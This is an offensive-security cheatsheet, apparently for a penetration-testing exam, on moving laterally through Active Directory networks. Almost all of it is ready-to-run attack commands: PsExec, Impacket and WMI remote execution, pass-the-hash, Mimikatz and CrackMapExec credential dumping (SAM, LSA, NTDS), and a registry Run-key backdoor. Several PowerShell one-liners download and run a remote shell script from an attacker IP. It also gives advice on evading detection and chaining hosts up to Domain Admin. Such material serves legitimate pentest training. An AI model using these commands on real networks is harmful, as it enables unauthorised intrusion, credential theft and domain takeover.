    Lateral Movement Cheatsheet

    Overview

    Lateral movement is the technique of moving through a network from one compromised system to another. This cheatsheet covers practical lateral movement techniques for Active Directory environments in .

    Prerequisites

    What You Need

    • [ ] Compromised credentials (password or hash)
    • [ ] Valid domain account
    • [ ] Network connectivity to target
    • [ ] Administrative privileges (for most techniques)
    • [ ] Target hostname or IP address

    Credential Types

    # Username and Password
DOMAIN\username : password

# NTLM Hash
DOMAIN\username : NTLM_HASH

# Kerberos Ticket
ticket.kirbi file

    PsExec

    Using Sysinternals PsExec

    Basic Usage: 

    # With credentials
psexec.exe \\TARGET -u DOMAIN\username -p password cmd.exe

# As SYSTEM
psexec.exe \\TARGET -u DOMAIN\username -p password -s cmd.exe

# Interactive session
psexec.exe \\TARGET -u DOMAIN\username -p password -i cmd.exe

# Copy executable
psexec.exe \\TARGET -u DOMAIN\username -p password -c payload.exe

# Execute and return output
psexec.exe \\TARGET -u DOMAIN\username -p password ipconfig

    Using Impacket PsExec

    # With password
impacket-psexec DOMAIN/username:password@TARGET
impacket-psexec DOMAIN/username:password@192.168.1.100

# With NTLM hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/username@TARGET
impacket-psexec -hashes :e19ccf75ee54e06b06a5907af13cef42 CORP/admin@192.168.1.100

# With Kerberos
impacket-psexec -k -no-pass DOMAIN/username@TARGET

# Execute specific command
impacket-psexec DOMAIN/username:password@TARGET 'whoami'

    Examples: 

    # Password authentication
impacket-psexec CORP/Administrator:P@ssw0rd@192.168.1.100

# Hash authentication
impacket-psexec -hashes :e19ccf75ee54e06b06a5907af13cef42 CORP/Administrator@DC01

# Get shell
impacket-psexec CORP/user:pass@192.168.1.100 cmd.exe

    WMI (Windows Management Instrumentation)

    Using WMIC

    # Execute command
wmic /node:TARGET /user:DOMAIN\username /password:password process call create "cmd.exe /c whoami"

# Execute payload
wmic /node:TARGET /user:DOMAIN\username /password:password process call create "C:\temp\payload.exe"

# Multiple targets
wmic /node:@targets.txt /user:DOMAIN\username /password:password process call create "cmd.exe"

# Get process list
wmic /node:TARGET /user:DOMAIN\username /password:password process list brief

    Using Impacket WMIExec

    # With password
impacket-wmiexec DOMAIN/username:password@TARGET
impacket-wmiexec CORP/Administrator:P@ssw0rd@192.168.1.100

# With NTLM hash
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/username@TARGET
impacket-wmiexec -hashes :e19ccf75ee54e06b06a5907af13cef42 CORP/admin@192.168.1.100

# Execute command
impacket-wmiexec DOMAIN/username:password@TARGET 'ipconfig'

# Semi-interactive shell
impacket-wmiexec CORP/user:pass@192.168.1.100

    Using PowerShell WMI

    # Create credential object
$password = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $password)

# Execute command via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName TARGET -Credential $cred

# One-liner
$pass = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('CORP\admin', $pass); Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')" -ComputerName 192.168.1.100 -Credential $cred

    WinRM (Windows Remote Management)

    Using PowerShell Remoting

    Basic Commands: 

    # Test if WinRM is enabled
Test-WSMan -ComputerName TARGET

# Create credential
$password = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $password)

# Enter interactive session
Enter-PSSession -ComputerName TARGET -Credential $cred

# Execute command
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# Execute script
Invoke-Command -ComputerName TARGET -Credential $cred -FilePath C:\script.ps1

# Multiple targets
Invoke-Command -ComputerName TARGET1,TARGET2,TARGET3 -Credential $cred -ScriptBlock { hostname }

    One-Liners: 

    # Quick command execution
$pass = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force; $cred = New-Object PSCredential('CORP\admin', $pass); Invoke-Command -ComputerName 192.168.1.100 -Credential $cred -ScriptBlock { whoami }

# Download and execute
$pass = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force; $cred = New-Object PSCredential('CORP\admin', $pass); Invoke-Command -ComputerName 192.168.1.100 -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1') }

    Using Evil-WinRM

    # With password
evil-winrm -i TARGET -u username -p password
evil-winrm -i 192.168.1.100 -u Administrator -p 'P@ssw0rd'

# With NTLM hash
evil-winrm -i TARGET -u username -H NTLM_HASH
evil-winrm -i 192.168.1.100 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42

# With SSL
evil-winrm -i TARGET -u username -p password -S

# Upload file
evil-winrm -i TARGET -u username -p password -e /path/to/file

# Execute script
evil-winrm -i TARGET -u username -p password -s script.ps1

    SMB (Server Message Block)

    Using smbclient

    # List shares
smbclient -L //TARGET -U DOMAIN\username
smbclient -L //192.168.1.100 -U CORP\admin

# Connect to share
smbclient //TARGET/SHARE -U DOMAIN\username
smbclient //192.168.1.100/C$ -U CORP\Administrator

# With password
smbclient //TARGET/C$ -U DOMAIN\username%password

# With hash (pass-the-hash)
smbclient //TARGET/C$ --pw-nt-hash -U DOMAIN\username%NTLM_HASH

# Execute command
smbclient //TARGET/C$ -U username -c 'ls'

    Using Impacket SMBExec

    # With password
impacket-smbexec DOMAIN/username:password@TARGET
impacket-smbexec CORP/Administrator:P@ssw0rd@192.168.1.100

# With NTLM hash
impacket-smbexec -hashes :NTLM_HASH DOMAIN/username@TARGET
impacket-smbexec -hashes :e19ccf75ee54e06b06a5907af13cef42 CORP/admin@192.168.1.100

    Mounting SMB Shares

    Windows: 

    # Map network drive
net use Z: \\TARGET\C$ /user:DOMAIN\username password

# Access without mapping
dir \\TARGET\C$
copy payload.exe \\TARGET\C$\temp\

# Unmount
net use Z: /delete

    Linux: 

    # Mount SMB share
mount -t cifs //TARGET/C$ /mnt/share -o username=user,password=pass,domain=DOMAIN

# With credentials file
mount -t cifs //TARGET/C$ /mnt/share -o credentials=/path/to/creds.txt

# Unmount
umount /mnt/share

    RDP (Remote Desktop Protocol)

    Using xfreerdp

    # Basic connection
xfreerdp /v:TARGET /u:DOMAIN\username /p:password
xfreerdp /v:192.168.1.100 /u:CORP\Administrator /p:'P@ssw0rd'

# With hash (Restricted Admin mode required)
xfreerdp /v:TARGET /u:username /pth:NTLM_HASH

# Full screen
xfreerdp /v:TARGET /u:username /p:password /f

# Specific resolution
xfreerdp /v:TARGET /u:username /p:password /w:1920 /h:1080

# Share local drive
xfreerdp /v:TARGET /u:username /p:password /drive:share,/tmp

# Enable clipboard
xfreerdp /v:TARGET /u:username /p:password +clipboard

# Disable TLS security
xfreerdp /v:TARGET /u:username /p:password /sec:rdp

    Using rdesktop

    # Basic connection
rdesktop TARGET -u DOMAIN\username -p password
rdesktop 192.168.1.100 -u CORP\admin -p 'P@ssw0rd'

# Full screen
rdesktop TARGET -u username -p password -f

# Specific resolution
rdesktop TARGET -u username -p password -g 1920x1080

    Pass-the-Hash (PTH)

    Using Impacket Tools

    # PsExec with hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/username@TARGET

# WMIExec with hash
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/username@TARGET

# SMBExec with hash
impacket-smbexec -hashes :NTLM_HASH DOMAIN/username@TARGET

# AtExec with hash
impacket-atexec -hashes :NTLM_HASH DOMAIN/username@TARGET 'whoami'

# DcomExec with hash
impacket-dcomexec -hashes :NTLM_HASH DOMAIN/username@TARGET

    Using CrackMapExec

    # Execute command with hash
crackmapexec smb TARGET -u username -H NTLM_HASH -x "whoami"
crackmapexec smb 192.168.1.100 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42 -x "ipconfig"

# Execute PowerShell
crackmapexec smb TARGET -u username -H NTLM_HASH -X '$PSVersionTable'

# Dump SAM
crackmapexec smb TARGET -u username -H NTLM_HASH --sam

# Dump LSA
crackmapexec smb TARGET -u username -H NTLM_HASH --lsa

# Multiple targets
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH -x "whoami"

    Using Mimikatz PTH

    # Pass-the-Hash to spawn cmd
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:cmd.exe" "exit"

# From new cmd, access remote system
dir \\TARGET\C$
psexec.exe \\TARGET cmd.exe

    DCOM (Distributed Component Object Model)

    Using Impacket DcomExec

    # With password
impacket-dcomexec DOMAIN/username:password@TARGET
impacket-dcomexec CORP/Administrator:P@ssw0rd@192.168.1.100

# With hash
impacket-dcomexec -hashes :NTLM_HASH DOMAIN/username@TARGET
impacket-dcomexec -hashes :e19ccf75ee54e06b06a5907af13cef42 CORP/admin@192.168.1.100

# Execute command
impacket-dcomexec DOMAIN/username:password@TARGET 'ipconfig'

    Using PowerShell DCOM

    # MMC20.Application
$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",@("/c","calc.exe"),"C:\Windows\System32",$null)

# ShellWindows
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"TARGET"))
$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)

# ShellBrowserWindow
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)

    Scheduled Tasks

    Using schtasks

    # Create scheduled task
schtasks /create /tn "TaskName" /tr "C:\payload.exe" /sc once /st 00:00 /S TARGET /U DOMAIN\username /P password

# Execute immediately
schtasks /create /tn "TaskName" /tr "cmd.exe /c whoami" /sc once /st 00:00 /S TARGET /U DOMAIN\username /P password
schtasks /run /tn "TaskName" /S TARGET /U DOMAIN\username /P password

# Delete task
schtasks /delete /tn "TaskName" /S TARGET /U DOMAIN\username /P password /F

# List tasks
schtasks /query /S TARGET /U DOMAIN\username /P password

    Using Impacket AtExec

    # With password
impacket-atexec DOMAIN/username:password@TARGET 'whoami'
impacket-atexec CORP/Administrator:P@ssw0rd@192.168.1.100 'ipconfig'

# With hash
impacket-atexec -hashes :NTLM_HASH DOMAIN/username@TARGET 'whoami'
impacket-atexec -hashes :e19ccf75ee54e06b06a5907af13cef42 CORP/admin@192.168.1.100 'net user'

    Windows Services

    Using sc.exe

    # Create service
sc \\TARGET create ServiceName binPath= "C:\payload.exe" obj= "DOMAIN\username" password= "password"

# Start service
sc \\TARGET start ServiceName

# Stop service  
sc \\TARGET stop ServiceName

# Delete service
sc \\TARGET delete ServiceName

# Query service
sc \\TARGET query ServiceName

    Using PowerShell

    # Create credential
$password = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $password)

# Create service remotely
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {
    New-Service -Name "ServiceName" -BinaryPathName "C:\payload.exe" -StartupType Automatic
    Start-Service -Name "ServiceName"
}

    CrackMapExec (Swiss Army Knife)

    Basic Usage

    # Check access
crackmapexec smb TARGET -u username -p password
crackmapexec smb 192.168.1.100 -u Administrator -p 'P@ssw0rd'

# With hash
crackmapexec smb TARGET -u username -H NTLM_HASH

# Network scan
crackmapexec smb 192.168.1.0/24 -u username -p password

# Check local admin
crackmapexec smb TARGET -u username -p password --local-auth

    Command Execution

    # Execute command
crackmapexec smb TARGET -u username -p password -x "whoami"
crackmapexec smb 192.168.1.100 -u admin -p pass -x "ipconfig /all"

# Execute PowerShell
crackmapexec smb TARGET -u username -p password -X '$env:COMPUTERNAME'

# Execute on multiple hosts
crackmapexec smb 192.168.1.0/24 -u admin -p pass -x "hostname"

    Credential Dumping

    # Dump SAM
crackmapexec smb TARGET -u username -p password --sam

# Dump LSA secrets
crackmapexec smb TARGET -u username -p password --lsa

# Dump NTDS.dit (DC only)
crackmapexec smb DC -u username -p password --ntds

# Dump with VSS
crackmapexec smb DC -u username -p password --ntds vss

    Module Usage

    # List modules
crackmapexec smb -L

# Use specific module
crackmapexec smb TARGET -u username -p password -M MODULE_NAME

# Mimikatz module
crackmapexec smb TARGET -u username -p password -M mimikatz

# Empire module
crackmapexec smb TARGET -u username -p password -M empire_exec -o LISTENER=http

    Remote Registry

    Using reg.exe

    # Query remote registry
reg query \\TARGET\HKLM\Software /s

# Save registry hive
reg save \\TARGET\HKLM\SAM C:\temp\SAM
reg save \\TARGET\HKLM\SYSTEM C:\temp\SYSTEM

# Add registry key
reg add \\TARGET\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\payload.exe"

    Using PowerShell

    # Query remote registry
Invoke-Command -ComputerName TARGET -ScriptBlock { Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion' }

# With credentials
$cred = Get-Credential
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { Get-ItemProperty -Path 'HKLM:\Software' }

    Lateral Movement with Credentials

    Credential Formats

    # Clear-text password
DOMAIN\username:password

# NTLM hash
DOMAIN\username:NTLM_HASH

# LM:NTLM format
DOMAIN\username:LM_HASH:NTLM_HASH

# Kerberos ticket
.kirbi or .ccache file

    Quick Lateral Movement

    # 1. PsExec (loudest but most reliable)
impacket-psexec DOMAIN/user:pass@TARGET

# 2. WMIExec (stealthier, semi-interactive)
impacket-wmiexec DOMAIN/user:pass@TARGET

# 3. SMBExec (uses service, stealthy)
impacket-smbexec DOMAIN/user:pass@TARGET

# 4. AtExec (scheduled task, one command)
impacket-atexec DOMAIN/user:pass@TARGET 'whoami'

# 5. DcomExec (DCOM, stealthier)
impacket-dcomexec DOMAIN/user:pass@TARGET

    Exam Scenarios

    Scenario 1: You Have Password

    # Step 1: Verify credentials work
crackmapexec smb TARGET -u username -p password

# Step 2: Get shell (choose one)
impacket-psexec DOMAIN/username:password@TARGET
impacket-wmiexec DOMAIN/username:password@TARGET
evil-winrm -i TARGET -u username -p password

# Step 3: Enumerate further

    Scenario 2: You Have NTLM Hash

    # Step 1: Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/username@TARGET

# Step 2: If PSExec fails, try WMI
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/username@TARGET

# Step 3: Dump credentials on new box
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

    Scenario 3: Pivot Through Multiple Hosts

    # Host A (your entry point)
# Dump credentials
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Found: DOMAIN\user2 with hash

# Lateral move to Host B
impacket-wmiexec -hashes :HASH DOMAIN/user2@HOSTB

# On Host B, dump more credentials
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Found: DOMAIN\admin with hash

# Lateral move to DC
impacket-psexec -hashes :HASH DOMAIN/admin@DC

    Scenario 4: Spray and Move

    # Find all accessible systems
crackmapexec smb 192.168.1.0/24 -u username -p password

# Results show access to:
# 192.168.1.10 (Pwn3d!)
# 192.168.1.15 (Pwn3d!)
# 192.168.1.20 (Pwn3d!)

# Get shell on each
impacket-wmiexec DOMAIN/user:pass@192.168.1.10
impacket-wmiexec DOMAIN/user:pass@192.168.1.15
impacket-wmiexec DOMAIN/user:pass@192.168.1.20

# Dump credentials on each
# Find DA credentials
# Move to DC

    Essential Commands

    Method Command
    PsExec impacket-psexec DOMAIN/user:pass@TARGET
    WMIExec impacket-wmiexec DOMAIN/user:pass@TARGET
    SMBExec impacket-smbexec DOMAIN/user:pass@TARGET

    PTH PsExec impacket-psexec -hashes :HASH DOMAIN/user@TARGET

    Tool Selection Guide

    Need interactive shell?
├─ Yes
│  ├─ Windows tools available? → PsExec.exe
│  ├─ WinRM enabled? → Evil-WinRM
│  └─ General → impacket-psexec
└─ No (single command)
   ├─ Stealth important? → impacket-atexec or impacket-dcomexec
   └─ Speed important? → impacket-wmiexec

    Pro Tips

    Exam Tips

    • Always try multiple methods - one might work when others fail
    • PsExec is reliable but noisy - use first to verify access
    • WMIExec is stealthier - good for avoiding detection
    • Evil-WinRM is great if WinRM (5985/5986) is open
    • Document all credentials and where you found them
    • Test credentials immediately after obtaining them
    • Pivot systematically - document your path through network

    Credential Reuse

    • Try credentials everywhere - admins reuse passwords
    • Local admin hash often works on multiple machines
    • Domain credentials work across entire domain
    • Service accounts often have access to many systems
    • Use CrackMapExec to spray credentials across network

    Stealth Considerations

    • PsExec creates a service (logged)
    • WMI is stealthier, no service creation
    • DCOM is very stealthy
    • Scheduled tasks leave logs but work well
    • WinRM is legitimate admin traffic

    Common Mistakes

    • Not trying multiple lateral movement methods
    • Forgetting to check if WinRM is enabled
    • Not documenting successful lateral moves
    • Using wrong credential format (domain\user vs user@domain)
    • Not cleaning up services/tasks after use
    • Forgetting to URL-encode special characters in passwords

    Restrictions

    • Document all lateral movement in your report
    • Note which credentials worked on which systems
    • Show the path of compromise (A → B → C → DC)
    • Include screenshots of successful access
    • Don't use automated exploitation beyond manual tools

    Troubleshooting

    Common Issues

    1. "Access Denied" 

    # User doesn't have admin rights on target
# Try different user or check group membership
net user username /domain

    2. "Cannot connect to target" 

    # Firewall blocking
# Try different method (WMI vs PsExec)
# Check if service is running

    3. "Authentication Failed" 

    # Wrong credentials
# Try different credential format
# Check domain name is correct

    4. WinRM "Access Denied" 

    # User not in "Remote Management Users" group
# Try: net localgroup "Remote Management Users" username /add

    5. Hash not working 

    # Restricted Admin mode disabled for RDP
# Use different method (PSExec, WMI)
# Ensure using correct hash format (NTLM only, no LM)

    Summary

    Most Common Lateral Movement Commands

    # 1. PsExec with password
impacket-psexec DOMAIN/username:password@TARGET

# 2. WMIExec with password
impacket-wmiexec DOMAIN/username:password@TARGET

# 3. Evil-WinRM
evil-winrm -i TARGET -u username -p password

# 4. Pass-the-Hash with PsExec
impacket-psexec -hashes :NTLM_HASH DOMAIN/username@TARGET

# 5. CrackMapExec for access check
crackmapexec smb TARGET -u username -p password

# 6. CrackMapExec for command execution
crackmapexec smb TARGET -u username -p password -x "whoami"

    Lateral Movement Flow

    1. Obtain Credentials
   ↓
2. Verify Access (CrackMapExec)
   ↓
3. Get Shell (PsExec/WMI/WinRM)
   ↓
4. Dump Credentials (Mimikatz)
   ↓
5. Repeat until Domain Admin

    Remember

    1. Try multiple methods - different tools for different situations
    2. Document everything - show your lateral movement path
    3. Use hashes when you can't crack - Pass-the-Hash is powerful
    4. Test credentials everywhere - reuse is common
    5. Be systematic - enumerate, move, dump, repeat
